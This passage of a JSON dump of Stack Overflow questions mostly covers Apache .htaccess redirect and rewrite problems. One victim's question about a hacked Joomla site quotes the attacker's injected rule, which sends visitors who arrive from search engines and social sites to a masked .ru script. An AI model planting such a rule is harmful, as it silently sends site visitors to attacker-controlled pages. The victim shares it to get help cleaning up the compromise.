href=\"http://www.google.co.in/url?sa=t&amp;rct=j&amp;q=padmavatiwealth.com&amp;source=web&amp;cd=1&amp;cad=rja&amp;ved=0CB0QFjAA&amp;url=http%3A%2F%2Fwww.padmavatiwealth.com%2F&amp;ei=Wl2bUI3YH4yqrAfyjIHwDw&amp;usg=AFQjCNE8ifN9KNmcMjPYwAAoZe0NjsvfgQ\" rel=\"nofollow\">http://www.google.co.in/url?sa=t&amp;rct=j&amp;q=padmavatiwealth.com&amp;source=web&amp;cd=1&amp;cad=rja&amp;ved=0CB0QFjAA&amp;url=http%3A%2F%2Fwww.padmavatiwealth.com%2F&amp;ei=Wl2bUI3YH4yqrAfyjIHwDw&amp;usg=AFQjCNE8ifN9KNmcMjPYwAAoZe0NjsvfgQ</a></p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["wordpress",".htaccess","redirect","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1095,"score":0,"question_id":7697877,"title":"Redirect non-www on a Wordpress site without using .htaccess","body":"<p>A developer that I worked with told me that we had the non-www version of the site redirecting to the www version using a Wordpress database setting, not the .htaccess file. Does anybody know how to do this?</p>\n"},{"tags":["html",".htaccess","redirect","ssl"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13284623,"title":"HTML redirection with SSL","body":"<p>I currently have a SSL certificate on my site that only covers the www-subdomain. Hence <a href=\"https://www.mydomain.com\" rel=\"nofollow\">https://www.mydomain.com</a> will show the SSL certificate, but <a href=\"https://mydomain.com\" rel=\"nofollow\">https://mydomain.com</a> will not.</p>\n\n<p>I have a folder called \"admin\" which is under SSL and accessible through <a href=\"https://www.mydomain.com/admin/\" rel=\"nofollow\">https://www.mydomain.com/admin/</a>. Note the slash at the end. If I only enter <a href=\"https://www.mydomain.com/admin\" rel=\"nofollow\">https://www.mydomain.com/admin</a> (without the slash), the website redirects to <a href=\"https://mydomain.com/admin/\" rel=\"nofollow\">https://mydomain.com/admin/</a> (without the www, but with the slash). At this stage I get a message indicating that the SSL certificate is invalid for this domain.</p>\n\n<p>Is there anyway I can make sure that when entering the URL without the slash at the end, the user is still redirected to the www-subdomain admin folder (https://www.mydomain.com/admin/)? Maybe with something in .htaccess?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":4348,"score":1,"question_id":1321123,"title":"redirect from subdomain to domain + .htaccess","body":"<p>Is is possible that i can configure RewriteRule for more then one domain.</p>\n\n<p>Like my requirement is \nMy current domain name www.maindomain.com\nand let say i have three domian and subdomain \nthe subdomain url is \nexample1.maindomain.com\nexample2.maindomain.com\nexample3.maindomain.com</p>\n\n<p>Now i want when ever user try to access www.example1.com it should get the content of example1.maindomain.com and the same for example2, example3</p>\n\n<p>I am using apache + passenger.</p>\n\n<p>Thanks for help.</p>\n"},{"tags":[".htaccess","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13281090,"title":".htaccess symfony2","body":"<p>I have a website implemented in Symfony, and supported by the following directory structure:</p>\n\n<pre><code>servername/folder/web/app.php/login\n</code></pre>\n\n<p>I created an htaccess file in the root folder, with the following content:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ /Symfony/web/app.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>The server is redirecting requests correctly, except for JavaScript and CSS files, which are simply not working. </p>\n\n<p>Can anyone help me with this issue?</p>\n"},{"tags":[".htaccess","joomla","ftp","godaddy","hacking"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":97,"score":0,"question_id":13261922,"title":"Malicious redirects in the .htaccess file in joomla site","body":"<p>I am using godaddy shared hosting account and yesterday I found that my htaccess is hacked and redirected my site to ladygaga's site. </p>\n\n<p>I deleted the .htaccess file but after a while i figured out they are rewriting the .htaccess file in certain time interval by keeping malicious script in my site.</p>\n\n<p>I deleted few unknown php files from the site but it didn't solve the problem. I have around 50 sites in the same hosting server and these all are joomla, so I couldn't figure out where is that file.</p>\n\n<p>I also did 404 chmodd to htaccess but still the script is rewriting the htaccess file. </p>\n\n<p>Here is the rewritten htacces code by hackers: ( I have replaced xx in their domain name)</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On                \nRewriteCond %{HTTP_REFERER} ^.*(duckduckgo|ask|google|dogpile|archive|clusty|mahalo|mywebsearch|blekko|lycos|webcrawler|info|infospace|search|excite|goodsearch|altavista|live|msn|aol|yahoo|youtube|wikipedia|infoseek|bing|facebook|twitter|myspace|linkedin|flickr|deviantart|livejournal|tagged|badoo|mylife|ning|pinterest)\\.(.*)\nRewriteRule ^(.*)$ http://XX.ru/generatorsinister.cgi?8 [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>My question is what's the easiest way to solve this issue?</strong> </p>\n\n<p>Godaddy has \"restore files and directories\" option in their hosting account, does that remove those added php files from the directory if i restore 5 days back ( I am sure 5 days back the site was running well). </p>\n\n<p>I could ask this question to godaddy support, but they don't provide good support to shared hosting customers. </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","httpd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":16,"score":-2,"question_id":13280129,"title":"Simulate DirectoryIndext with RewriteRule","body":"<p>I need to make a RewriteRule that can rewrite:</p>\n\n<pre><code>site.com or site.com/ \n</code></pre>\n\n<p>to:</p>\n\n<pre><code>site.com/file.xx\n</code></pre>\n\n<p>Really not sure how to write this and make it work properly. Any help please?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","trailing-slash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13235180,"title":"How to remove trailing slash for '/folder/index.html', when 'index.html' is stripped?","body":"<p>I have a static site with the following file/folder structure:</p>\n\n<ul>\n<li>index.html</li>\n<li>/foobar/\n<ul>\n<li>index.html</li>\n<li>bob.html</li>\n<li>alice.html</li>\n</ul></li>\n</ul>\n\n<p>I'd like to achieve the following:</p>\n\n<ul>\n<li>remove all <code>.html</code> extensions. <strong>✔ works</strong></li>\n<li>remove <code>index.html</code> (resp. <code>index</code>). <strong>✔ works</strong></li>\n<li>I want files to end without trailing slash. <strong>✔ works</strong>\n<ul>\n<li>if someone adds a trailing slash, redirect to URL without trailing slash. <strong>✘ doesn't work</strong></li>\n</ul></li>\n<li>I want \"folders\" (actually <code>index.html</code> files inside a folder) to end without trailing slash. <strong>✘ doesn't work</strong>\n<ul>\n<li>if someone adds a trailing slash, redirect to URL without trailing slash. <strong>✘ doesn't work</strong></li>\n</ul></li>\n</ul>\n\n<p>So the following URLs should work:</p>\n\n<ul>\n<li><code>example.com/</code> (actually: <code>/index.html</code>)</li>\n<li><code>example.com/foobar</code> (actually: <code>/foobar/index.html</code>)</li>\n<li><code>example.com/foobar/bob</code> (actually: <code>/foobar/bob.html</code>)</li>\n<li><code>example.com/foobar/alice</code> (actually: <code>/foobar/alice.html</code>)</li>\n</ul>\n\n<p>The following requests should redirect (301):</p>\n\n<ul>\n<li><code>example.com/foobar/</code> redirects to: <code>example.com/foobar</code>)</li>\n<li><code>example.com/foobar/bob/</code> redirects to: <code>example.com/foobar/bob</code>)</li>\n<li><code>example.com/foobar/alice/</code> redirects to: <code>example.com/foobar/alice</code>)</li>\n</ul>\n\n<p>I see that this would create a problem when a file <code>/foobar.html</code> exists: when someone visits <code>/foobar</code>, it is not clear whether the directory or the file is requested. However, I will make sure that this never happens.</p>\n\n<hr>\n\n<p>At the moment, I have this <code>.htaccess</code>:</p>\n\n<pre><code># Turn MultiViews off. (MultiViews on causes /abc to go to /abc.ext.) \nOptions +FollowSymLinks -MultiViews\n\n# It stops DirectorySlash from being processed if mod_rewrite isn't. \n&lt;IfModule mod_rewrite.c&gt;\n\n    # Disable mod_dir adding missing trailing slashes to directory requests.\n    DirectorySlash Off\n\n    RewriteEngine On\n\n    # If it's a request to index(.html) \n    RewriteCond %{THE_REQUEST} \\ /(.+/)?index(\\.html)?(\\?.*)?\\  [NC]\n    # Remove it. \n    RewriteRule ^(.+/)?index(\\.html)?$ /%1 [R=301,L]\n\n    # Add missing trailing slashes to directories if a matching .html does not exist. \n    # If it's a request to a directory. \n    RewriteCond %{SCRIPT_FILENAME}/ -d\n    # And a HTML file does not (!) exist.\n    RewriteCond %{SCRIPT_FILENAME}.html !-f\n    # And there is not trailing slash redirect to add it. \n    RewriteRule [^/]$ %{REQUEST_URI}/ [R=301,L]\n\n    # Remove HTML extensions. \n    # If it's a request from a browser, not an internal request by Apache/mod_rewrite. \n    RewriteCond %{ENV:REDIRECT_STATUS} ^$\n    # And the request has a HTML extension. Redirect to remove it. \n    RewriteRule ^(.+)\\.html$ /$1 [R=301,L]\n\n    # If the request exists with a .html extension. \n    RewriteCond %{SCRIPT_FILENAME}.html -f\n    # And there is no trailing slash, rewrite to add the .html extension. \n    RewriteRule [^/]$ %{REQUEST_URI}.html [QSA,L]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>What would I have to change/remove/add in my <code>.htaccess</code>? I don't understand much of it. I tried to remove the block commented \"Add missing trailing slashes to directories if a matching .html does not exist\", but this didn't help. </p>\n"},{"tags":[".htaccess","zend-framework","mod-rewrite","folder"],"answer_count":0,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":34,"score":5,"question_id":13272679,"title":"mod_rewrite select a folder for the domain","body":"<p><strong>Situation</strong></p>\n\n<p>I'm using Zend framework, and thus attempt to call the folder by address ends in a fiasco and we gets the error: 'Invalid controller specified'. I needed to hook up additional forum to application in a separate folder. I change .htaccess file as follow:</p>\n\n<pre><code>RewriteRule ^forum(.*)$ forum$1 [L]\n</code></pre>\n\n<p>and for a while it was good, until I realized the fact that the page exists in two versions in two domains (php recognizes domain [.pl/.co.uk] and selects the language). So I decided to separate forums as a two separate modules (for example, the folder for Polish version forum will be: forum_pl, and for UK it will be: forum_uk - two different forums)</p>\n\n<p><strong>What's the problem?</strong></p>\n\n<p>It needs to rewrite .htaccess file to work like this:</p>\n\n<p><strong>IF:</strong> www.domena.pl/forum</p>\n\n<p><strong>THEN:</strong> open to the script from the folder /forum_pl</p>\n\n<p><strong>IF:</strong> www.domain.co.uk/forum </p>\n\n<p><strong>THEN:</strong> open to the script from the folder /forum_uk.</p>\n\n<p>The worst thing is that when I tried to fix .htaccess file adding RewriteCond then the first redirect no longer work correctly, even after returning to the original (shown above) version.</p>\n\n<p>Please help me and sorry if I did not find answers already given earlier.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p><strong>First working solution</strong></p>\n\n<pre><code>RewriteRule ^forum_pl(.*)$ forum_pl$1 [L]\nRewriteRule ^forum_uk(.*)$ forum_uk$1 [L]\nRewriteCond %{HTTP_HOST} ^www.domena.pl(.*) [NC]\nRewriteRule ^forum(.*)$ forum_pl$1 [L]\nRewriteCond %{HTTP_HOST} ^www.domain.co.uk(.*) [NC]\nRewriteRule ^forum(.*)$ forum_uk$1 [L]\n</code></pre>\n\n<p>It's look like it wants to work but, problems that needs solution is (TODO):</p>\n\n<ol>\n<li>When you type: www.domain.pl/forum it gets you to www.domain.pl/forum_pl/ but if you type: www.domain.pl/forum/ it gets you to www.domain.pl/forum/ (read from forum_pl). How to make that it works in first situation same, as in second.</li>\n</ol>\n\n<p><strong>EDIT:</strong></p>\n\n<p><strong>My last solution:</strong></p>\n\n<pre><code>#FORUM\n#PL\nRewriteCond %{REQUEST_URI} ^/forum$ [NC]\nRewriteRule ^(.*)$ forum/ [R=301,L]\n\nRewriteRule ^forum_pl(.*)$ forum_pl$1 [L]\n\nRewriteCond %{REQUEST_URI} ^/forum_pl(.*)$ [NC]\nRewriteRule ^(.*)$ http://www.domena.pl/forum/ [R=301,L] #Dosen't work properly (?)\n\nRewriteCond %{HTTP_HOST} ^www.domena.pl(.*) [NC]\nRewriteCond %{REQUEST_URI} ^/forum(/?)$ [NC]\nRewriteRule ^forum[^/](.*)$ forum_pl/$1 #Dosen't work properly, but without it crash!\nRewriteRule ^forum(.*)$ forum_pl$1 [L]\n#UK\nRewriteCond %{REQUEST_URI} ^/forum_uk(.*)$ [NC]\nRewriteRule ^(.*)$ http://www.domain.co.uk/forum/ [R=301,L] #Dosen't work properly (?)\n\nRewriteCond %{HTTP_HOST} ^www.domain.co.uk(.*) [NC]\nRewriteCond %{REQUEST_URI} ^/forum(/?)$ [NC]\nRewriteRule ^forum[^/](.*)$ forum_uk/$1 #Dosen't work properly, but without it crash!\nRewriteRule ^forum(.*)$ forum_uk$1 [L]\n</code></pre>\n"},{"tags":["apache",".htaccess","directory","webserver","httpd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":412,"score":1,"question_id":9718284,"title":"How to remove 'Parent Directory' link from root folder in Apache directory listing","body":"<p>How can I allow directory listing in Apache for a specific (root) folder and its subfolders, but without showing a link to parent of that root folder. When user is in a subfolder, the 'Parent Directory'link is displayed to navigate to its parent, but when user is at the root folder I need to remove/hide this 'Parent Directory' link so that user cannot move above that 'root' hierarchy.</p>\n"},{"tags":["apache",".htaccess","webserver","httpd"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":10,"score":0,"question_id":13279241,"title":"Serve manually compressed index if client supports gzip","body":"<p>I have two files: index.html and index.html.gz.</p>\n\n<p>If the client supports gzip, i want to serve index.html.gz.\nIf the client does not, i want to serve index.html.</p>\n\n<p>This should work if the visitor visits www.site.com</p>\n\n<p>Really not sure how this can be done :(</p>\n\n<p>EDIT: I'm trying to get it to work in .htaccess</p>\n\n<p>I can do it easily with other pages by doing:</p>\n\n<pre><code>RewriteCond %{HTTP:Accept-encoding} gzip\nRewriteRule ^contact\\.html$ contact.gz\n</code></pre>\n\n<p>But i can't do it with the index since people don't type in www.site.com/index.html. They leave index.html out.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13278858,"title":"Add extra condition to htaccess rule","body":"<p>Is it possible to add another condition to the following line. In addition to the env=requested_pdf check, I also want to check if User-Agent is IE. Thanks for any help. </p>\n\n<pre><code>Header add Content-Disposition \"attachment\" env=requested_pdf\n</code></pre>\n"},{"tags":[".htaccess","url","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":19,"score":2,"question_id":13278439,"title":"Using .htaccess Redirect 301 without changing URL in Address Bar","body":"<p>I currently have a WordPress Multi-Site Network set up. The main website is located at <code>\"http://safesideinc.com.\"</code> Then, there is another sub-domain <code>\"http://danielgosek.safesideinc.com.\"</code> </p>\n\n<p>I want the URL \"http://safesideinc.com\" to lead to <code>\"http://safesideinc.com,\"</code> and the URL <code>\"http://danielgosek.com\"</code> to lead to <code>\"http://danielgosek.safesideinc.com.\"</code></p>\n\n<p>Using a 301 Redirect in .htaccess, I can achieve this. However, I would like it so that entering <code>\"http://danielgosek.com\"</code> in the URL bar leads to <code>\"http://danielgosek.safesideinc.com.\"</code> WITHOUT CHANGING the URL displayed--in this case, the displayed URL should remain <code>\"http://danielgosek.com.\"</code></p>\n\n<p>Are there any rules that could help me achieve this?</p>\n"},{"tags":[".htaccess","codeigniter","apache2","ubuntu-12.04"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13275555,"title":"htaccess and httpd.conf configuraion to enable codeigniter working on ubuntu 12.04","body":"<p>I have installed ubuntu 12.04 and I have complete requirements(apache,mysql and php5) for running php projects. Projects which are not in codeigniter are working well. Within codeigniter , when I load the project  the default controller loads the index_view but when I click to other controllers; they  wont work with error  and display error</p>\n\n<h2>Not Found The requested URL /academic/login was not found on this server.</h2>\n\n<p>I realized that the .htaccess wont work; then the /etc/apache2/httpd.conf file is empty\n I would like to request a sample of basic configuration of httpd.conf file so that my htaccess file can work. If any suggestion that can help me to arrive at some results would be appreciated. Thanks.\n My httaccess is given below\n</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\n### Canonicalize codeigniter URLs\n\n# If your default controller is something other than\n# \"welcome\" you should probably change this\nRewriteRule ^(platform(/index)?)/?$ / [L,R=301]\nRewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n# Removes trailing slashes (prevents SEO duplicate content issues)\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n\n# Enforce www\n# If you have subdomains, you can add them to\n# the list using the \"|\" (OR) regex operator\nRewriteCond %{HTTP_HOST} !^(localhost|academic) [NC]\nRewriteRule ^(.*)$ http://localhost/academic/$1 [L,R=301]\n\n# Enforce NO www\n#RewriteCond %{HTTP_HOST} ^www [NC]\n#RewriteRule ^(.*)$ http://domain.tld/$1 [L,R=301]\n\n###\n\n# Removes access to the system folder by users.\n# Additionally this will allow you to create a System.php controller,\n# previously this would not have been possible.\n# 'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\n# Checks to see if the user is attempting to access a valid file,\n# such as an image or css document, if this isn't true it sends the\n# request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p></p>\n\n<p></p>\n\n<pre><code># Without mod_rewrite, route 404's to the front controller\nErrorDocument 404 /index.php\n</code></pre>\n\n<p></p>\n"},{"tags":["php",".htaccess","url","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13277467,"title":"htaccess url rewrite wont work on diffrent file","body":"<p>I'm using htaccess url rewrite this is my code </p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([^/]*)\\.html$ main.php?pagina=$1 [L]\n</code></pre>\n\n<p>(this one works)</p>\n\n<pre><code>RewriteRule ^([^/]*)/([^/]*)\\.html$ main.php?pagina=$1&amp;ID=$2 [L]\n</code></pre>\n\n<p>(this one works)</p>\n\n<pre><code>RewriteRule ^([^/]*)/([^/]*)/([^/]*)\\.html$ main.php?pagina=$1&amp;artiest=$2&amp;ID=$3 [L]\n</code></pre>\n\n<p>(this one works, it shows video/artist/id.html)</p>\n\n<pre><code>RewriteRule ^([^/]*)/([^/]*)/([^/]*)\\.html$ main.php?pagina=$1&amp;seo=$2&amp;ID=$3 [L]\n</code></pre>\n\n<p>(this one wont work I want this one to show news/seo-title/id.html)</p>\n\n<p>Can anyone help ?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","iis7"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13276180,"title":"Convert IIS Rewrite with conditions to .htaccess (mod_rewrite)","body":"<p>I am trying to figure out how to convert an IIS Rewrite rule with conditions to a .htaccess rule for Apache (mod_rewrite). I have seen some simple examples without the conditions that have helped me get part of the way there (I think). Here is the IIS Rewrite rule:</p>\n\n<pre><code>&lt;rule name=\"vanity-url\" stopProcessing=\"true\"&gt;\n  &lt;match url=\"^(.*)$\" /&gt;\n  &lt;conditions logicalGrouping=\"MatchAll\"&gt;\n    &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" negate=\"true\" /&gt;\n    &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" negate=\"true\" /&gt;\n    &lt;add input=\"{REQUEST_URI}\" pattern=\"\\.\" negate=\"true\" /&gt;\n  &lt;/conditions&gt;\n  &lt;action type=\"Rewrite\" url=\"/default.php\" /&gt;\n&lt;/rule&gt;\n</code></pre>\n\n<p>I currently have this much for my .htaccess:</p>\n\n<pre><code>RewriteCond $1 !^(default\\.php)\nRewriteRule ^(.*)$ /default.php [L]\n</code></pre>\n\n<p>I had to include the RewriteCond shown to keep it from causing an endless redirect loop when going to the home page of the site, but I am not sure that is the correct way to map this particular rule. The home page is now coming up (no 500 error for the endless redirects), but not everything is showing correctly on the page and I believe this has to do with the conditions.</p>\n\n<p>EDIT:\nI have added the following conditions:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond \\. [L]\n</code></pre>\n\n<p>Which seems to help, but I'm still not sure if it's truly following the IIS rule listed.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","get","friendly-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13275740,"title":"Using RewriteRule on Friendly-URL - Get Variables with Redirect 301","body":"<p>I'm having some problems. I searched a lot, tried variations, and still can't get this working.</p>\n\n<p>My aim is simply this:</p>\n\n<p>Redirect:\n<a href=\"http://site.com/folder1/folder2/\" rel=\"nofollow\">http://site.com/folder1/folder2/</a><strong>page</strong></p>\n\n<p>To:\n<a href=\"http://site.com/folder1/folder2/\" rel=\"nofollow\">http://site.com/folder1/folder2/</a><strong>Page</strong></p>\n\n<p>Notice that I'm using \"Friendly URLs\".</p>\n\n<p>Now here are the methods I tried, and the problems I came accross.</p>\n\n<p>1) <strong>Redirect 301</strong></p>\n\n<pre><code>Redirect 301 /folder1/folder2/page http://site.com/folder1/folder2/Page\n</code></pre>\n\n<p>This Redirect works, the problem is, my Get Variables from \"page\" are appearing at the end of the URL, which is bad for SEO:</p>\n\n<p><a href=\"http://site.com/folder1/folder2/Page?get=page\" rel=\"nofollow\">http://site.com/folder1/folder2/Page?get=page</a></p>\n\n<p>2) <strong>RewriteRule</strong></p>\n\n<p>RewriteRule of mod_rewrite is supposed to fix the problem of the Get Variables appearing (From what I've read).</p>\n\n<p>The problem is, I'm not getting it to work for my Fancy URL structure.</p>\n\n<pre><code>RewriteRule ^/folder1/folder2/page$ http://site.com/folder1/folder2/Page [R=301,L]\n</code></pre>\n\n<p>It simply doesn't work. The Redirect isn't carried out, so something must be wrong here. I tried many variations to that code.</p>\n\n<p>Can't you use RewriteRule directly on Friendly URLs?</p>\n\n<p><em>(Friendly URL meaning I stripped off the .php extension)</em></p>\n\n<p>Looking forward to some help!\nThanks!</p>\n\n<hr>\n\n<p>Update 1:</p>\n\n<p>Please note that Case Sensitivity is Not the issue here.</p>\n\n<p>Even if my example was: <strong>Page1 => Page 2</strong></p>\n\n<p>Instead of: <strong>page => Page</strong></p>\n\n<p>The problems still persist.</p>\n\n<hr>\n\n<p>Update 2:</p>\n\n<p>This is the closest solution I got so far (but still not there yet):</p>\n\n<pre><code>Redirect 301 /folder1/folder2/page http://site.com/folder1/folder2/Page?\n</code></pre>\n\n<p>I added a \"?\" at the end.</p>\n\n<p>This will give me the landing URL of:\n<a href=\"http://site.com/folder1/folder2/Page\" rel=\"nofollow\">http://site.com/folder1/folder2/Page</a>?</p>\n\n<p>It removes the Get Variables, but still not as SEO friendly as I would like.</p>\n"},{"tags":["php",".htaccess","seo"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13267188,"title":"PHP SEO optimized address and physical page address conflict","body":"<p>I have a static website that I am planning to move towards php. I will be using php to just load the navigation.htm and main contents page and combine to form a single html file. </p>\n\n<ol>\n<li><p>Actual Page is here: <a href=\"http://abubakar.zxq.net/html/0007HorizontalAxisWindTurbineMadeWithPVCPipe.htm\" rel=\"nofollow\">http://abubakar.zxq.net/html/0007HorizontalAxisWindTurbineMadeWithPVCPipe.htm</a></p></li>\n<li><p>How It is accessed through php:\n<a href=\"http://abubakar.zxq.net/index.php?page=0007HorizontalAxisWindTurbineMadeWithPVCPipe.htm\" rel=\"nofollow\">http://abubakar.zxq.net/index.php?page=0007HorizontalAxisWindTurbineMadeWithPVCPipe.htm</a></p></li>\n</ol>\n\n<p>I want the page to look like 2 when site is addressed with URL in 1. It is needed to keep the already shared URLs remain working.</p>\n\n<p>Here is how I defined httaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^html/([a-zA-Z0-9_-]+)$ index.php?page=$1\n</code></pre>\n\n<p>Kindly inform is it possible to do it in present form? I have a solution in mind that old files should be shifted to a new folder and the design php so that it works on old link. Thanks in advance for your kind help.</p>\n"},{"tags":[".htaccess","hotlinking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":13275470,"title":"How to prevent accessing swf directly from web server (hot linking)","body":"<p>I want to prevent some people to access the SWF directly from my site: </p>\n\n<p>Some people use that piece of code: </p>\n\n<pre><code>&lt;iframe src=\"http://www.mysite.com/chat.swf?id=1000\" frameborder=\"0\" width=\"100%\" height=\"680\" scrolling=\"no\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>So I tried to use .htaccess</p>\n\n<pre><code>RewriteCond %{HTTP_REFERER} !^http://(.+\\.)?mysite\\.com/ [NC]\nRewriteCond %{HTTP_REFERER} !^$\nRewriteRule .*\\.swf*$ http://www.mysite.com\n</code></pre>\n\n<p>Does not seems to work !</p>\n\n<p>Any clue ?</p>\n"},{"tags":[".htaccess","url","parameters","url-rewriting","rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":13,"score":-1,"question_id":13275352,"title":"Hide parameters with url rewriting .htaccess","body":"<p>Hi i want to hide parameters, transform for exemple <code>www.website.com/page.php?parameter=value</code> to <code>www.website.com/page/value</code></p>\n\n<p>Here is my .htaccess code, but it dosen't work :</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^page/([0-9a-zA-Z])$ /page.php?parameter=$1 [L,QSA]\n</code></pre>\n\n<p>Thanks !</p>\n"},{"tags":["wordpress",".htaccess","url","permalinks"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":144,"score":1,"question_id":11819223,"title":"htaccess configuration with multiple domains, subfolders, wordpress index.php","body":"<p>I am really struggling with an .htaccess issue and getting Wordpress pretty permalinks to work, and remove index.php. My webserver has the following directories:</p>\n\n<pre><code>webroot\n   -mydomain1 [wordpress folder]\n   -mydomain2\n   -mydomain3\n</code></pre>\n\n<p>In my webroot I have the following .htaccess file in the root with the following code. This redirect works just fine and points each domain to the relevant subfolder.</p>\n\n<pre><code>#Turns the rewrite engine on.\nRewriteEngine on\n\n#Fix missing trailing slash character on folders.\nRewriteRule ^([^.?]+[^.?/])$ $1/ [R,L]\n\n#www.mydomain1.ca and mydomain1.ca will map to the folder\n{root}/mydomain1/\n RewriteCond %{HTTP:Host} ^(?:www\\.)?mydomain1\\.ca$\n RewriteRule (.*) /mydomain1/$1 [NC,L,NS]\n\n#www.mydomain2.com and mydomain2.com will map to the folder\n{root}/mydomain2/\n RewriteCond %{HTTP:Host} ^(?:www\\.)?mydomain2\\.com$\n RewriteRule (.*) /mydomain2/$1 [NC,L,NS]\n\n#www.mydomain3.com and mydomain3.com will map to the folder\n{root}/mydomain3/\n RewriteCond %{HTTP:Host} ^(?:www\\.)?mydomain3\\.com$\n RewriteRule (.*) /mydomain3/$1 [NC,L,NS]\n\n#subdomain.domain.com will map to the folder {root}/folder3/\n RewriteCond %{HTTP:Host} ^(?:subdomain\\.domain\\.com)?$\n RewriteRule (.*) /folder3/$1 [NC,L,NS]\n</code></pre>\n\n<p>In the wordpress directory (mydomain1) I have been trying to place the standard Wordpress .htaccess file. I was hoping this would remove the index.php from the URLs served up my Wordpress. When I put this file into the wordpress directory and setup up the Wordpress permalinks to /%postname%/ i get 404 errors and no pages. The .htaccess file I am trying to use here  is:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>I have talked to my hosting provider and they support mod_rewrite and subs and dont seem to be able to help. I have also gone into wordpress and set the permalinks to /%postname%/\nThe result of all of this is that I cannot access the site anymore. Can anyone help me please - I am reading all sorts of useful tips and tricks but with nothing seeming to help or work.</p>\n"},{"tags":[".htaccess","redirect","clean-urls"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":16,"score":-1,"question_id":13274014,"title":".htaccess redirect to one of two locations based on URL","body":"<p>So let's say I have website: <a href=\"http://www.blahblah.com\" rel=\"nofollow\">http://www.blahblah.com</a></p>\n\n<p>I want it so that if they go to the root of the site (any of the following: <a href=\"http://www.blahblah.com\" rel=\"nofollow\">http://www.blahblah.com</a>, <a href=\"http://www.blahblah.com/\" rel=\"nofollow\">http://www.blahblah.com/</a>, <a href=\"http://www.blahblah.com/index.php\" rel=\"nofollow\">http://www.blahblah.com/index.php</a>, www.blahblah.com/, www.blahblah.com/index.php, www.blahblah.com), then the user is taken to index.php, which would be the \"homepage\".</p>\n\n<p>If they type in anything else after the root URL, then I want it to take them to subpage.php, which would then break down the URL and determine which page to display from there.</p>\n\n<p>So, for example:</p>\n\n<p>Let's say the user types in www.blahblah.com/pages/aboutme.  This would redirect the user to subpage.php.  subpage.php would have a script in it that would explode the URL by \"/\" and then look into the database for a matching record, and display content accordingly.</p>\n\n<p>Any idea how I could do this with my .htaccess file?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":9,"score":1,"question_id":13271375,"title":"Htaccess rules. redirecting from an android version to the 